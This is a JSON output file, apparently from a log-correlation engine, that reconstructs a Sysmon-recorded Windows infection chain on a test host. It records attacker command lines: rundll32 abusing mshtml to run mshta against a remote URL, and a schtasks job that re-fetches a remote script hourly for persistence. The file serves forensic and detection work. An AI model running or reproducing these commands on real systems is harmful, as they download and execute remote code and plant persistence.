@@ -1,0 +1,307 @@
+{
+  "schema_version": 1,
+  "engine_version": "2.0.0",
+  "engine_sha256": "9874104f0e9a6948f10469ed995c2b531745d7cc86027d8227d3decb491a6e60",
+  "scenario": {
+    "id": "case-001",
+    "collection_reason": "Single case database from pinned replay; independent from all other cases.",
+    "source_sha256": [
+      "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c"
+    ]
+  },
+  "raw_events": 8,
+  "unique_observations": 8,
+  "duplicate_observations": 0,
+  "parameters": {
+    "failure_threshold": 5,
+    "auth_window_seconds": 600,
+    "chain_window_seconds": 900
+  },
+  "nodes": [
+    {
+      "id": "9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3",
+      "host": "IEWIN7",
+      "guid": "365abb72-1a29-5ce4-0000-001054e32101",
+      "timestamp": "2019-05-21T15:32:57.286254Z",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe  /C rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
+      "user": "IEWIN7\\IEUser",
+      "risk_marker": null,
+      "evidence": [
+        {
+          "event_uid": "9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3",
+          "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+          "source_line": 1,
+          "record_id": 4125,
+          "timestamp": "2019-05-21T15:32:57.286254Z",
+          "host": "IEWIN7",
+          "event_id": 1
+        }
+      ],
+      "activity": []
+    },
+    {
+      "id": "f94fd9c8ee88ebafb5166d3435ca119e2557505ea0227ec39b9ca0bf16911185",
+      "host": "IEWIN7",
+      "guid": "365abb72-1a29-5ce4-0000-00107be42101",
+      "timestamp": "2019-05-21T15:32:57.286254Z",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
+      "user": "IEWIN7\\IEUser",
+      "risk_marker": null,
+      "evidence": [
+        {
+          "event_uid": "f94fd9c8ee88ebafb5166d3435ca119e2557505ea0227ec39b9ca0bf16911185",
+          "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+          "source_line": 2,
+          "record_id": 4126,
+          "timestamp": "2019-05-21T15:32:57.286254Z",
+          "host": "IEWIN7",
+          "event_id": 1
+        }
+      ],
+      "activity": []
+    },
+    {
+      "id": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+      "host": "IEWIN7",
+      "guid": "365abb72-1a29-5ce4-0000-001079f92101",
+      "timestamp": "2019-05-21T15:32:57.867089Z",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "command": "\"C:\\Windows\\System32\\mshta.exe\" https://hotelesms.com/talsk.txt",
+      "user": "IEWIN7\\IEUser",
+      "risk_marker": "mshta remote/inline script argument",
+      "evidence": [
+        {
+          "event_uid": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+          "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+          "source_line": 3,
+          "record_id": 4127,
+          "timestamp": "2019-05-21T15:32:57.867089Z",
+          "host": "IEWIN7",
+          "event_id": 1
+        }
+      ],
+      "activity": [
+        {
+          "evidence": {
+            "event_uid": "4da9dabc1159199db487dc43717d12ef500cb4acbac4b3cc42d9c4d4105e4d19",
+            "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+            "source_line": 4,
+            "record_id": 4128,
+            "timestamp": "2019-05-21T15:32:59.389278Z",
+            "host": "IEWIN7",
+            "event_id": 3
+          },
+          "fields": {
+            "DestinationHostname": "gator4243.hostgator.com",
+            "DestinationIp": "108.179.232.58",
+            "DestinationIsIpv6": "false",
+            "DestinationPort": "443",
+            "DestinationPortName": "https",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "Initiated": "true",
+            "ProcessGuid": "{365abb72-1a29-5ce4-0000-001079f92101}",
+            "ProcessId": "2432",
+            "Protocol": "tcp",
+            "RuleName": "",
+            "SourceHostname": "IEWIN7..home",
+            "SourceIp": "10.0.2.15",
+            "SourceIsIpv6": "false",
+            "SourcePort": "49703",
+            "SourcePortName": "",
+            "User": "IEWIN7\\IEUser",
+            "UtcTime": "2019-05-21 06:58:39.888"
+          }
+        },
+        {
+          "evidence": {
+            "event_uid": "d3fca0276ddda43c44e14013887c9b0f2360ea803fed40825bf94ea95bac97dd",
+            "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+            "source_line": 7,
+            "record_id": 4131,
+            "timestamp": "2019-05-21T15:33:00.140358Z",
+            "host": "IEWIN7",
+            "event_id": 3
+          },
+          "fields": {
+            "DestinationHostname": "aka112.inwitelecom.net",
+            "DestinationIp": "105.73.6.112",
+            "DestinationIsIpv6": "false",
+            "DestinationPort": "80",
+            "DestinationPortName": "http",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "Initiated": "true",
+            "ProcessGuid": "{365abb72-1a29-5ce4-0000-001079f92101}",
+            "ProcessId": "2432",
+            "Protocol": "tcp",
+            "RuleName": "",
+            "SourceHostname": "IEWIN7..home",
+            "SourceIp": "10.0.2.15",
+            "SourceIsIpv6": "false",
+            "SourcePort": "49704",
+            "SourcePortName": "",
+            "User": "IEWIN7\\IEUser",
+            "UtcTime": "2019-05-21 06:58:40.518"
+          }
+        },
+        {
+          "evidence": {
+            "event_uid": "5a08c74a73ec7f369de04ecf8a188993c71e64fc46eee1eb570d808cabc00110",
+            "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+            "source_line": 8,
+            "record_id": 4132,
+            "timestamp": "2019-05-21T15:33:01.141798Z",
+            "host": "IEWIN7",
+            "event_id": 3
+          },
+          "fields": {
+            "DestinationHostname": "aka105.inwitelecom.net",
+            "DestinationIp": "105.73.6.105",
+            "DestinationIsIpv6": "false",
+            "DestinationPort": "80",
+            "DestinationPortName": "http",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "Initiated": "true",
+            "ProcessGuid": "{365abb72-1a29-5ce4-0000-001079f92101}",
+            "ProcessId": "2432",
+            "Protocol": "tcp",
+            "RuleName": "",
+            "SourceHostname": "IEWIN7..home",
+            "SourceIp": "10.0.2.15",
+            "SourceIsIpv6": "false",
+            "SourcePort": "49705",
+            "SourcePortName": "",
+            "User": "IEWIN7\\IEUser",
+            "UtcTime": "2019-05-21 06:58:40.721"
+          }
+        }
+      ]
+    },
+    {
+      "id": "e6772dcb7ab9befda0f559a2f256f1c414ee392e70abe09940efb7e50983dc34",
+      "host": "IEWIN7",
+      "guid": "365abb72-1a2b-5ce4-0000-00102f502201",
+      "timestamp": "2019-05-21T15:32:59.769825Z",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "\"C:\\Windows\\System32\\schtasks.exe\" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR \"mshta.exe https://hotelesms.com/Injection.txt\" /F ",
+      "user": "IEWIN7\\IEUser",
+      "risk_marker": null,
+      "evidence": [
+        {
+          "event_uid": "e6772dcb7ab9befda0f559a2f256f1c414ee392e70abe09940efb7e50983dc34",
+          "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+          "source_line": 5,
+          "record_id": 4129,
+          "timestamp": "2019-05-21T15:32:59.769825Z",
+          "host": "IEWIN7",
+          "event_id": 1
+        }
+      ],
+      "activity": []
+    }
+  ],
+  "edges": [
+    {
+      "from": "9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3",
+      "to": "f94fd9c8ee88ebafb5166d3435ca119e2557505ea0227ec39b9ca0bf16911185",
+      "basis": "same host + ParentProcessGuid = ProcessGuid + parent observed no later than child",
+      "evidence": {
+        "event_uid": "f94fd9c8ee88ebafb5166d3435ca119e2557505ea0227ec39b9ca0bf16911185",
+        "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+        "source_line": 2,
+        "record_id": 4126,
+        "timestamp": "2019-05-21T15:32:57.286254Z",
+        "host": "IEWIN7",
+        "event_id": 1
+      }
+    },
+    {
+      "from": "f94fd9c8ee88ebafb5166d3435ca119e2557505ea0227ec39b9ca0bf16911185",
+      "to": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+      "basis": "same host + ParentProcessGuid = ProcessGuid + parent observed no later than child",
+      "evidence": {
+        "event_uid": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+        "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+        "source_line": 3,
+        "record_id": 4127,
+        "timestamp": "2019-05-21T15:32:57.867089Z",
+        "host": "IEWIN7",
+        "event_id": 1
+      }
+    },
+    {
+      "from": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+      "to": "e6772dcb7ab9befda0f559a2f256f1c414ee392e70abe09940efb7e50983dc34",
+      "basis": "same host + ParentProcessGuid = ProcessGuid + parent observed no later than child",
+      "evidence": {
+        "event_uid": "e6772dcb7ab9befda0f559a2f256f1c414ee392e70abe09940efb7e50983dc34",
+        "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+        "source_line": 5,
+        "record_id": 4129,
+        "timestamp": "2019-05-21T15:32:59.769825Z",
+        "host": "IEWIN7",
+        "event_id": 1
+      }
+    }
+  ],
+  "chains": [],
+  "candidates": [],
+  "diagnostics": [
+    {
+      "code": "parent_not_observed",
+      "child": "9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3",
+      "parent_guid": "365abb72-4f8a-5ce3-0000-0010c5bb4800"
+    },
+    {
+      "code": "unjoined_process_activity",
+      "evidence": {
+        "event_uid": "444978f688b4c649dc1f510b867eacbd2765a3c35fd19d542e114b72611e65a3",
+        "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+        "source_line": 6,
+        "record_id": 4130,
+        "timestamp": "2019-05-21T15:32:59.809883Z",
+        "host": "IEWIN7",
+        "event_id": 11
+      }
+    }
+  ],
+  "telemetry": [
+    {
+      "name": "Failed logon",
+      "provider": "microsoft-windows-security-auditing",
+      "event_id": 4625,
+      "count": 0
+    },
+    {
+      "name": "Successful logon",
+      "provider": "microsoft-windows-security-auditing",
+      "event_id": 4624,
+      "count": 0
+    },
+    {
+      "name": "Process creation",
+      "provider": "microsoft-windows-sysmon",
+      "event_id": 1,
+      "count": 4
+    },
+    {
+      "name": "Network connection",
+      "provider": "microsoft-windows-sysmon",
+      "event_id": 3,
+      "count": 3
+    },
+    {
+      "name": "Task registration",
+      "provider": "microsoft-windows-security-auditing",
+      "event_id": 4698,
+      "count": 0
+    }
+  ],
+  "event_counts": {
+    "Microsoft-Windows-Sysmon / 1": 4,
+    "Microsoft-Windows-Sysmon / 3": 3,
+    "Microsoft-Windows-Sysmon / 11": 1
+  },
+  "verdict": "unassessed; correlation creates review leads"
+}
